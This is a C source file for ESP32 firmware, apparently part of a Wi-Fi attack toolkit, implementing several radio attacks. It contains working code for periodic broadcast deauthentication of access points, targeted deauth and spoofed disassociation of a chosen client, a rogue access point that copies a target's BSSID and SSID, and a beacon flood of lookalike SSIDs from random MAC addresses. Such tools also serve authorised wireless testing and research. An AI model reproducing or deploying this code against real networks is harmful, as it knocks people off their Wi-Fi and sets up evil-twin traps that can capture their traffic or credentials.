/**
 * @file attack_method.c
 * @author risinek (risinek@gmail.com), SameerAlSahab (sameeralsahab54@gmail.com)
 * @date 8-5-2026
 * @copyright Copyright (c) 2026
 *
 * @brief Implements common methods for various attacks.
 * IMPORTANT: Does NOT re-initialise NVS / netif / event_loop / WiFi.
 * Those are already done by wifi_controller in this project.
 */

#include "attack_method.h"
#include "attack.h"
#include "attack_dos.h"
#include "esp_wifi.h"
#include "hydra_ssd1306_display.h"

#include <string.h>
#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_err.h"
#include "esp_timer.h"
#include "esp_wifi_types.h"
#include "esp_random.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include <endian.h>

#include "wifi_controller.h"
#include "wsl_bypasser.h"
#include "webserver.h"

static const char *TAG = "main:attack_method";

static void timer_send_deauth_frame(void *arg) {
    wifi_ap_record_t *ap = (wifi_ap_record_t *) arg;

    esp_err_t ch_err = esp_wifi_set_channel(ap->primary, WIFI_SECOND_CHAN_NONE);
    if (ch_err != ESP_OK) {
        ESP_LOGV(TAG, "Channel set skip (AP mode active): %s", esp_err_to_name(ch_err));
        return;
    }

    wsl_bypasser_send_deauth_frame(ap);
}

static esp_timer_handle_t deauth_timer_handles[MAX_ATTACK_TARGETS];
static uint8_t active_timers = 0;

/* Timer callbacks must not hold a pointer into the scanner's live record array:
 * a background rescan reallocates it and the timer then reads freed memory. */
static wifi_ap_record_t broadcast_ap_copy[MAX_ATTACK_TARGETS];

void attack_method_broadcast(const wifi_ap_record_t *ap_record, unsigned period_sec) {
    (void)period_sec;
    esp_wifi_set_ps(WIFI_PS_NONE);
    if (active_timers >= MAX_ATTACK_TARGETS) {
        ESP_LOGW(TAG, "Max targets reached, skipping AP: %s", ap_record->ssid);
        return;
    }

    uint8_t slot = active_timers;
    memcpy(&broadcast_ap_copy[slot], ap_record, sizeof(wifi_ap_record_t));

    const esp_timer_create_args_t deauth_timer_args = {
        .callback = &timer_send_deauth_frame,
        .arg = (void *) &broadcast_ap_copy[slot]
    };

    esp_err_t err = esp_timer_create(&deauth_timer_args, &deauth_timer_handles[slot]);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "Timer create failed: %s", esp_err_to_name(err));
        return;
    }

    err = esp_timer_start_periodic(deauth_timer_handles[slot], 100000);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "Timer start failed: %s", esp_err_to_name(err));
        esp_timer_delete(deauth_timer_handles[slot]);
        return;
    }

    active_timers++;
    ESP_LOGD(TAG, "Timer started for BSSID: %02x:%02x...", ap_record->bssid[0], ap_record->bssid[1]);
}

void attack_method_broadcast_stop() {
    for (int i = 0; i < active_timers; i++) {
        /* Not every timer is guaranteed to be running — a target that dropped
         * out mid-attack leaves a stopped handle. ESP_ERROR_CHECK here used to
         * abort the whole firmware in that case. */
        if (esp_timer_is_active(deauth_timer_handles[i])) {
            esp_timer_stop(deauth_timer_handles[i]);
        }
        esp_timer_delete(deauth_timer_handles[i]);
        deauth_timer_handles[i] = NULL;
    }
    active_timers = 0;
    ESP_LOGI(TAG, "All deauth timers stopped.");
}

/**
 * @brief Stops every deauth flavour at once, regardless of which one started.
 *
 * attack_dos_stop() dispatches on the stored method, so a method change between
 * start and stop leaves timers running. Modules that don't track the method
 * (hunt, handshake) use this instead.
 */
void attack_method_deauth_all_stop() {
    attack_method_broadcast_stop();
    attack_method_targeted_stop();
    attack_method_super_clone_stop();
    ESP_LOGI(TAG, "All deauth methods stopped.");
}

void attack_method_rogueap(const wifi_ap_record_t *ap_record){
    ESP_LOGD(TAG, "Configuring Rogue AP");
    wifictl_set_ap_mac(ap_record->bssid);
    wifi_config_t ap_config = {
        .ap = {
            .ssid_len = strlen((char *)ap_record->ssid),
            .channel = ap_record->primary,
            .authmode = ap_record->authmode,
            .password = "dummypassword",
            .max_connection = 1
        },
    };
    memcpy(ap_config.ap.ssid, ap_record->ssid, 32);
    wifictl_ap_start(&ap_config);
}

static const char *TAG_SC = "main:super_clone";
static bool sc_running = false;
static TaskHandle_t sc_task_handle = NULL;
static char target_ssid[33];
static uint8_t target_channel = 1;

#define MAX_CLONES 15
static uint8_t clone_mac_pool[MAX_CLONES][6];

static void generate_clone_mac_pool() {
    for (int i = 0; i < MAX_CLONES; i++) {
        for (int j = 0; j < 6; j++) {
            clone_mac_pool[i][j] = esp_random() & 0xFF;
        }
        clone_mac_pool[i][0] = (clone_mac_pool[i][0] & 0xFE) | 0x02;
    }
}

static void super_clone_task(void *pvParameters) {
    ESP_LOGI(TAG_SC, "Cloning target wifi...");
    oled_log(OLED_LINE1, 2, "Cloning %s", target_ssid);
    esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);

    while (sc_running) {
        for (int i = 0; i < MAX_CLONES; i++) {
            char fake_ssid[33];
            int base_len = strlen(target_ssid);

            if (base_len + i + 1 > 32) break;

            strncpy(fake_ssid, target_ssid, base_len);
            for (int s = 0; s < (i + 1); s++) {
                fake_ssid[base_len + s] = ' ';
            }
            fake_ssid[base_len + i + 1] = '\0';
            uint8_t ssid_len = strlen(fake_ssid);

            wsl_bypasser_send_beacon_frame(clone_mac_pool[i], (uint8_t *)fake_ssid, ssid_len, target_channel);
        }
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    sc_task_handle = NULL;
    vTaskDelete(NULL);
}

void attack_method_super_clone(const wifi_ap_record_t *ap_record) {
    if (sc_running) return;
    if (ap_record == NULL) return;

    strncpy(target_ssid, (char *)ap_record->ssid, 32);
    target_ssid[32] = '\0';
    target_channel = ap_record->primary;

    generate_clone_mac_pool();
    sc_running = true;
    xTaskCreate(super_clone_task, "super_clone", 4096, NULL, 5, &sc_task_handle);
}

void attack_method_super_clone_stop(void) {
    sc_running = false;
}


/* ── Targeted (single-client) deauth ─────────────────────────────────────── */

static const char *TAG_TG = "main:targeted";
static uint8_t  target_client_mac[6];
static bool     target_client_set = false;
static wifi_ap_record_t targeted_ap;     /* own copy: ap_record may be transient */
static esp_timer_handle_t targeted_timer = NULL;

void attack_method_set_target_client(const uint8_t mac[6]) {
    memcpy(target_client_mac, mac, 6);
    target_client_set = true;
    ESP_LOGI(TAG_TG, "Target client set: %02X:%02X:%02X:%02X:%02X:%02X",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

bool attack_method_get_target_client(uint8_t out_mac[6]) {
    if (!target_client_set) return false;
    memcpy(out_mac, target_client_mac, 6);
    return true;
}

void attack_method_clear_target_client(void) {
    target_client_set = false;
}

static void timer_send_targeted_deauth(void *arg) {
    esp_err_t ch_err = esp_wifi_set_channel(targeted_ap.primary, WIFI_SECOND_CHAN_NONE);
    if (ch_err != ESP_OK) {
        ESP_LOGV(TAG_TG, "Channel set skip: %s", esp_err_to_name(ch_err));
        return;
    }
    /* Spoof both directions: AP->client (deauth) and client->AP (disassoc). */
    wsl_bypasser_send_deauth_targeted(targeted_ap.bssid, target_client_mac);
    wsl_bypasser_send_disassociation_frame(targeted_ap.bssid, target_client_mac);
}

void attack_method_targeted(const wifi_ap_record_t *ap_record) {
    if (ap_record == NULL) {
        ESP_LOGE(TAG_TG, "No AP record");
        return;
    }
    if (!target_client_set) {
        ESP_LOGE(TAG_TG, "No target client selected; scan & select one first");
        return;
    }
    if (targeted_timer != NULL) {
        ESP_LOGW(TAG_TG, "Targeted deauth already running");
        return;
    }

    memcpy(&targeted_ap, ap_record, sizeof(wifi_ap_record_t));
    esp_wifi_set_ps(WIFI_PS_NONE);

    const esp_timer_create_args_t targeted_timer_args = {
        .callback = &timer_send_targeted_deauth,
        .arg      = NULL,
        .name     = "targeted_deauth"
    };
    esp_err_t err = esp_timer_create(&targeted_timer_args, &targeted_timer);
    if (err != ESP_OK) {
        ESP_LOGE(TAG_TG, "Timer create failed: %s", esp_err_to_name(err));
        targeted_timer = NULL;
        return;
    }
    err = esp_timer_start_periodic(targeted_timer, 100000); /* every 100 ms */
    if (err != ESP_OK) {
        ESP_LOGE(TAG_TG, "Timer start failed: %s", esp_err_to_name(err));
        esp_timer_delete(targeted_timer);
        targeted_timer = NULL;
        return;
    }

    ESP_LOGI(TAG_TG, "Targeted deauth started on ch %d", targeted_ap.primary);
    oled_log(OLED_LINE1, 2, "Target deauth");
}

void attack_method_targeted_stop(void) {
    if (targeted_timer != NULL) {
        if (esp_timer_is_active(targeted_timer)) esp_timer_stop(targeted_timer);
        esp_timer_delete(targeted_timer);
        targeted_timer = NULL;
        ESP_LOGI(TAG_TG, "Targeted deauth stopped");
    }
}
